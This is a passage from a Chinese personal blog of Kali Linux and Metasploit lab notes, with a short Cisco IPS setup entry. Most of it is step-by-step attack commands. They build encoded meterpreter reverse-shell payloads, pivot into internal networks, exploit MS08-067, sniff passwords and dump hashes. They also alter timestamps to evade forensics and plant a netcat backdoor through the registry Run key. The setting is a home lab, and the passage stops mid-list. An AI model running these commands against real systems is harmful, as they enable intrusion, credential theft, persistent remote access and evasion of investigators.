<li>网卡2模式为Bridge模式，检查网络</li>
<li>LAN → 1.1.1.1 WAN → 192.168.0.110</li>
</ul>
</li>
<li>Mono 2<ul>
<li>网卡1模式为Host-only-3模式，检查网络</li>
<li>网卡2模式为Bridge模式，检查网络</li>
<li>2 set up A LAN Address<ul>
<li>2.1.1.1</li>
<li>24</li>
<li>dhcp</li>
<li>2.1.1.10</li>
<li>2.1.1.100</li>
</ul>
</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Host-only-2模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>浏览器访问mono 1<ul>
<li>Rules → WAN → LAN -&gt; Any</li>
<li>NAT → Inbound → <ul>
<li>External port range → from/to other4444</li>
<li>NAT IP → Kali的IP</li>
<li>Local port → other 4444</li>
<li>Auto-add a firewall rule to permit traffic through this NAT rule → Apply</li>
</ul>
</li>
<li>查看Rules → WAN是否添加规则正常</li>
<li>NAT → Inbound → <ul>
<li>External port range → from/to other80</li>
<li>NAT IP → Kali的IP</li>
<li>Local port → other 80</li>
<li>Auto-add a firewall rule to permit traffic through this NAT rule → Apply</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li>物理主机访问mono 1的Brige模式的IP，是否能看到Kali开启的Web服务</li>
</ul>
</li>
<li>Window 7<ul>
<li>网卡模式为Host-only-3模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>浏览器访问mono 2<ul>
<li>Rules → LAN → LAN -&gt; ANY<ul>
<li>Action → Pass</li>
<li>Interface → LAN</li>
<li>Sourece → LAN subnet</li>
<li>save</li>
</ul>
</li>
</ul>
</li>
<li>浏览器访问百度尝试</li>
<li>关闭Window 7的UAC验证</li>
<li>重启电脑</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=mono 1的Brige模式下的IP地址 LPORT=4444 -a x86 --platform windows -b &#39;\x00\xff&#39; -e x86/shikata_ga -f exe a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://mono" target="_blank" rel="noopener">http://mono</a> 1的Brige模式下的IP地址/a.exe，下载a.exe</li>
<li>执行a.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li>**`🔺命令：getuid</li>
<li><strong><code>🔺命令：run autoroute -s 2.1.1.0/24</code></strong></li>
<li><strong><code>🔺命令：run autoroute -p</code></strong> 查看路由表</li>
</ul>
</li>
</ul>
<h4 id="3-自动路由显示场景"><a href="#3-自动路由显示场景" class="headerlink" title="3. 自动路由显示场景"></a>3. 自动路由显示场景</h4><ul>
<li>利用win 7攻击内网XP（对比XP有无外网访问权的情况）</li>
<li>扫描内网：<strong><code>🔺命令：use auxiliary/scanner/portscan/tcp</code></strong></li>
<li>实验环境准备<ul>
<li>Window XP SP3 <ul>
<li>网卡模式为Host-only-3模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-实验–攻击内网其他主机"><a href="#4-实验–攻击内网其他主机" class="headerlink" title="4. 实验–攻击内网其他主机"></a>4. 实验–攻击内网其他主机</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use auxiliary/scanner/portscan/tcp</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS 2.1.1.9-2.1.1.12</code></strong></li>
<li><strong><code>🔺命令：set PORTS 139,445</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：db_nmap -sV -p445 -A -Pn Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Window 7的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>win 7若开启防火墙，可能要通过之前的shell来添加访问规则</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：background</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST mono的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>查看是否拿到shell</li>
<li>删除路由</li>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li><strong><code>🔺命令：run autoroute -h</code></strong></li>
<li><strong><code>🔺命令：run autoroute -d -s 2.1.1.0/24</code></strong><ul>
<li>-s：增加路由记录</li>
<li>-d -s：删除路由记录</li>
</ul>
</li>
<li><strong><code>🔺命令：run autoroute -p</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cde4WOBGkE-67B7-t8x-uUPvvcCMsAeX3Dr5Afm8UK9FyB5CvLHNttNiQyVEIFWDrVNP0WqaMCYTlsb6QNBnBUbX67mNGWeyEfaCEFEsVt_oWPp-Yt9g11EeV20nAFs3GZ1L7jM&file_name=/Pivoting%E8%87%AA%E5%8A%A8%E8%B7%AF%E7%94%B1.png" alt="Pivoting自动路由"></p>
<h4 id="5-Pivoting端口转发–Portfwd"><a href="#5-Pivoting端口转发–Portfwd" class="headerlink" title="5.  Pivoting端口转发–Portfwd"></a>5.  Pivoting端口转发–Portfwd</h4><ul>
<li>利用已经被控计算机，在Kali与攻击目标之间实现端口转发</li>
<li><strong><code>🔺命令：portfwd add -L LIP -l LPORT -r RIP -p RPORT</code></strong></li>
<li><strong><code>🔺命令：portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</code></strong> </li>
<li><strong><code>🔺命令：portfwd list  /  delete  /  flush</code></strong> </li>
</ul>
<h4 id="6-实验–Portfwd"><a href="#6-实验–Portfwd" class="headerlink" title="6. 实验–Portfwd"></a>6. 实验–Portfwd</h4><ul>
<li>Window XP SP3<ul>
<li>开启远程桌面</li>
</ul>
</li>
<li>Kali<ul>
<li>在上述实验Kali与Window 7建立的session的基础上</li>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li><strong><code>🔺命令：portfwd</code></strong></li>
<li><strong><code>🔺命令：portfwd add -L Kali的IP -l 3389 -r Window XP的IP -p 3389</code></strong></li>
<li><strong><code>🔺命令：portfwd list</code></strong>（Kali的IP）</li>
<li><strong><code>🔺命令：portfwd add -l 4489 -r Window XP的IP -p 3389</code></strong></li>
<li><strong><code>🔺命令：protfwd list</code></strong>（0.0.0.0）</li>
</ul>
</li>
<li>rdesktop Kali的IP的IP查看是否能开启远程桌面</li>
<li><strong><code>🔺命令：rdesktop 127.0.0.1:4489</code></strong>查看是否能开启远程桌面</li>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li>删除所有链接：<strong><code>🔺命令：portfwd flush</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/IPS%E7%AC%94%E8%AE%B0-2%EF%BC%9AIPS%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/03/IPS%E7%AC%94%E8%AE%B0-2%EF%BC%9AIPS%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" itemprop="url">IPS笔记-2：IPS环境搭建</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T21:08:12+08:00">
                2020-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IPS/" itemprop="url" rel="index">
                    <span itemprop="name">IPS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  97 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-选择GNS"><a href="#1-选择GNS" class="headerlink" title="1. 选择GNS"></a>1. 选择GNS</h4><ul>
<li>GNS可以导入外部模块，但PT不行</li>
</ul>
<h4 id="2-初始化IPS"><a href="#2-初始化IPS" class="headerlink" title="2. 初始化IPS"></a>2. 初始化IPS</h4><ul>
<li>setup<ul>
<li>Enter host name:IPS</li>
<li>Enter IP Interface:设置VM8的IP地址以及网关</li>
<li>▲ 其他默认</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=5a86oi6yOTNS07YY3OINzUyHIwuuliu_-E2Ev2gCAyKHNmMVEOs_yLSO8-UW6IEffU0sWSsKMggzYWSey71c7PX90rv9C32QR1Ij83hgNSSoepnsuv83F0LfR-Y6GHWj-JVdbAHci3ShMIlfI8UbdlocgWrJtQnpikAVaA&file_name=/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE.png" alt="IPS-4240初始化配置"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=5cd1C31nttN6F2NrCqMvUTlYTRM-gTUPYBIkcU2ZDFalsZSlFGfK52l8mVRZ-tEFZEa3p77hNYiqUnaG67g5rTtqoZCQKeO4zmGYadRS4v57bXe-fjYg5Rk-0pfeAhpNtDnBENsHQdBRCoh-Yigu_9NYH36RQubE6vX12fY6WeDq_Q&file_name=/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IPS-4240初始化配置成功"></p>
<h4 id="3-IME"><a href="#3-IME" class="headerlink" title="3. IME"></a>3. IME</h4><ul>
<li>安装IME对密码有要求，弱口令无法登陆</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=eb2fwpyckL9FPJ5wcHVi0lSuddeATvJK5QeZHTbijiWaH-l0raMvFTq-G9173Oi5q7lLbiczb_39Ezmk6ZnpQrwKBjPSM6m9L0ZOfVn8ittYw8CTT7CuI3PMbQG_GL2n_Nq0mIjXzRtgEe0VwKIIcz-sKAgpmDQtcK2Yt68AAPM&file_name=/IME%E8%AE%BE%E7%BD%AE%E7%AE%80%E5%8D%95%E5%AF%86%E7%A0%81%E6%8A%A5%E9%94%99.png" alt="IME设置简单密码报错"></p>
<ul>
<li>配置IME<ul>
<li>添加IPS的IP地址以及端口</li>
<li>添加IPS的账号密码</li>
<li>▲ 配置的时候，需要设置Configuration User和Event Subscription User</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=33b3qw5fIHWgmXDcofePJLbKG6UDncCVjUd7UlRAgtKlR3faQHZbAuBi6sSEfPol5BsZT5yAcjtCHgyjdkAaQdMZcaTL12ghYEA1Q0h7N5oG1B1kAmZMwLVpXAo5eANpTEPf-3BX4bilrNGHPkqpLpSVtIc&file_name=/IME%E6%B7%BB%E5%8A%A0%E8%AE%BE%E5%A4%87.png" alt="IME添加设备"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=26efovyBXGrEnXPg1tKkvAqXEX8VfUwHamdODeou4Dbi_xmeExU2WS1Z-AU-0HRHFo0uhTslY1YvrPdwyfYkIacp_oKL4nMdxQuI4WV9pU7TFinQiT1ghI2yquwetzY0N1kBAE-cEbpUNTsCc5T--bBRKcM&file_name=/IME%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IME配置成功"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=1fa40hgQzgiSfr4horT9aqT9yZfwcENsFf360gWv-CM_3qaTRbb4_ekpP9-QMwbBNqHMvzWFtFFqgtqSk46XFwn078A-hb_SVYdEePQeYNqy14_7HriLq-hTPhPcdI7wgV1aU0F_dv06nlIsMHIVcdrkIG2EEQ&file_name=/IPS%20Configuration.png" alt="IPS Configuration"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B9%9D)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86+%E5%90%8E%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B9%9D)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86+%E5%90%8E%E9%97%A8/" itemprop="url">Kali Linux笔记(一百零九)：MSF后渗透测试--信息收集+后门</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:35:04+08:00">
                2020-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  988 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1. 实验环境"></a>1. 实验环境</h4><ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
<li>关闭防火墙，关闭UAC并重启</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong> </li>
<li><strong><code>🔺命令：service apache2 start</code></strong> </li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong> </li>
<li><strong><code>🔺命令：msfconsole -q</code></strong> </li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：exploit</code></strong> </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
<h4 id="2-抓包（metrepreter）"><a href="#2-抓包（metrepreter）" class="headerlink" title="2. 抓包（metrepreter）"></a>2. 抓包（metrepreter）</h4><ul>
<li>在内存中缓存区块循环存储抓包（50000包），不写硬盘</li>
<li>智能过来meterpreter流量，传输全程使用SSL/TLS加密</li>
<li>Kali<ul>
<li><strong><code>🔺命令：load sniffer</code></strong> <ul>
<li><strong><code>🔺命令：sniffer_interfaces</code></strong>  </li>
<li><strong><code>🔺命令：sniffer_start 2</code></strong>  </li>
<li><strong><code>🔺命令：sniffer_dump 2 1.cap</code></strong>  </li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问路由器，输入密码</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：sniffer_dump 2 2.cap</code></strong> （含有密码信息）</li>
</ul>
</li>
</ul>
<h4 id="3-解码"><a href="#3-解码" class="headerlink" title="3. 解码"></a>3. 解码</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use auxiliary/sniffer/psnuffle</code></strong> </li>
<li><strong><code>🔺命令：set PCAPFILE /root/2.cap</code></strong> </li>
<li><strong><code>🔺命令：run</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="4-搜索文件（meterpreter）"><a href="#4-搜索文件（meterpreter）" class="headerlink" title="4. 搜索文件（meterpreter）"></a>4. 搜索文件（meterpreter）</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：search -f *.ini</code></strong>  </li>
<li><strong><code>🔺命令：search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="5-John-the-Ripper破解弱口令"><a href="#5-John-the-Ripper破解弱口令" class="headerlink" title="5. John the Ripper破解弱口令"></a>5. John the Ripper破解弱口令</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use post/windows/gather/hashdump</code></strong>   #system权限的meterpreter<ul>
<li><strong><code>🔺命令：set session sessionID</code></strong> </li>
<li><strong><code>🔺命令：run</code></strong>   #结果保存在/tmp目录下</li>
</ul>
</li>
<li><strong><code>🔺命令：use auxiliary/analyze/jtr_crack_fast</code></strong> <ul>
<li><strong><code>🔺命令：run</code></strong> </li>
</ul>
</li>
<li>▲ 2020.03.03 暂无jtr_crack_fast此模块</li>
</ul>
</li>
</ul>
<h4 id="6-MAC时间"><a href="#6-MAC时间" class="headerlink" title="6. MAC时间"></a>6. MAC时间</h4><ul>
<li>文件系统访问会留下痕迹，电子取证重点关注</li>
<li>渗透测试和攻击者往往希望销毁文件系统访问痕迹</li>
<li>最好的避免被电子取证发现的方法：不要碰文件系统<ul>
<li>Meterpreter的先天优势所在（完全基于内存）</li>
</ul>
</li>
<li>MAC时间（Modified / Accessed / Created）<ul>
<li><strong><code>🔺命令：echo aaaa &gt; 1.txt</code></strong> </li>
<li><strong><code>🔺命令：ls -l --time=atime/ctime 1.txt</code></strong> （默认的时间为modified time）</li>
<li>列出文件的MAC时间：<strong><code>🔺命令：stat 1.txt</code></strong> </li>
<li>修改文件的MAC时间<ul>
<li><strong><code>🔺命令：touch -d &quot;2 days ago&quot; 1.txt</code></strong> （Created时间）</li>
<li><strong><code>🔺命令：touch -t 1501010101 1.txt</code></strong> （Modified和Accessed时间）</li>
</ul>
</li>
</ul>
</li>
<li>MACE：MFT entry<ul>
<li>MFT：NTFS文件系统的主文件分配表Master File Table</li>
<li>通常1024字节或2个硬盘扇区，其中存放多项entry信息</li>
<li>包含文件大量信息（大小、名称、目录位置、磁盘位置、创建时间）</li>
<li>更多信息可研究文件系统取证分析技术</li>
<li>▲ 可通过修改文件名称来查看E的变化</li>
</ul>
</li>
</ul>
<h4 id="7-Timestomp（meterpreter）"><a href="#7-Timestomp（meterpreter）" class="headerlink" title="7. Timestomp（meterpreter）"></a>7. Timestomp（meterpreter）</h4><ul>
<li>Kali<ul>
<li>timestomp参数<ul>
<li>-v：显示详细MAC时间</li>
<li>-f：指定模板文件时间作为复制</li>
<li>-b -r（递归擦除）：擦除MAC时间信息，目前此参数功能失效</li>
<li>-a/-c/-m/-e：修改MACE的A/C/M/E参数的时间</li>
<li>-z：修改MACE的所有参数的时间</li>
</ul>
</li>
<li>▲ EnCase工具在电子取证中很出名</li>
<li><strong><code>🔺命令：timestomp -v 1.txt</code></strong>  </li>
<li><strong><code>🔺命令：timestomp -f c:\\autoexec.bat 1.txt</code></strong> </li>
<li><strong><code>🔺命令：timestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot;  2.txt</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）"><a href="#8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）" class="headerlink" title="8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）"></a>8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）</h4><ul>
<li>注册表保存着windows几乎全部配置参数<ul>
<li>如果修改不当，可直接造成系统崩溃</li>
<li>修改前完整备份注册表</li>
<li>某些注册表的修改是不可逆的</li>
</ul>
</li>
<li>常见用途<ul>
<li>修改、增加启动项</li>
<li>窃取存储于注册表中的机密信息</li>
<li>绕过文件型病毒查杀</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</code></strong> </li>
<li>查看Window 7系统启动程序：<strong><code>🔺命令：reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</code></strong>  </li>
<li>在查看的主键在新建监制：<strong><code>🔺命令：reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;</code></strong> </li>
<li><strong><code>🔺命令：reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></strong> </li>
<li><strong><code>🔺命令：execute -f cmd -i -H</code></strong>  </li>
<li><strong><code>🔺命令：netsh firewall show opmode</code></strong>  </li>
<li><strong><code>🔺命令：netsh firewall add portopening TCP 4444 &quot;test&quot; ENABLE ALL</code></strong>  </li>
<li><strong><code>🔺命令：shutdown -r -t 0</code></strong>  </li>
</ul>
</li>
<li>Window 7<ul>
<li><strong><code>🔺命令：netstat -nao</code></strong> 查看是否开启了4444端口</li>
<li><strong><code>🔺命令：tasklist</code></strong> 查看进程的PID</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：nc Kali的IP 4444</code></strong> </li>
</ul>
</li>
<li>其他注册表项<ul>
<li><a href="https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart" target="_blank" rel="noopener">https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart</a></li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:31:17+08:00">
                2020-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  785 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
<li>已经获得目标系统控制权后扩大战果<ul>
<li>提权</li>
<li>信息收集</li>
<li>渗透内网</li>
<li>永久后门</li>
</ul>
</li>
<li>实验环境<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
